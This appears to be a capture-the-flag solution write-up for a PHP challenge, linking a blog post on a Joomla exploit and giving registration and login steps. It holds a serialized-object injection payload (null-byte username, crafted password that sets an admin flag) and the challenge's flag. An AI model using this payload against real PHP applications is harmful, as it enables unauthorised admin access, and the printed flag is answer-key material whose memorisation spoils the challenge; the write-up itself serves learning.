# Solution

This is a PHP overflow challenge. Read [https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)

Solve:
1. Create account, set username to `\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0` and password to `ab";s:12:"\0\0\0_password";s:3:"abc";s:9:"\0\0\0_admin";b:1;s:12:"\0\0\0_reserved";s:47:"`
2. Log in with username `\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0` and password `abc`

Flag: `blahaj{d1Dnt_kN0w_pHP_C0u1D_0V3rf10W}`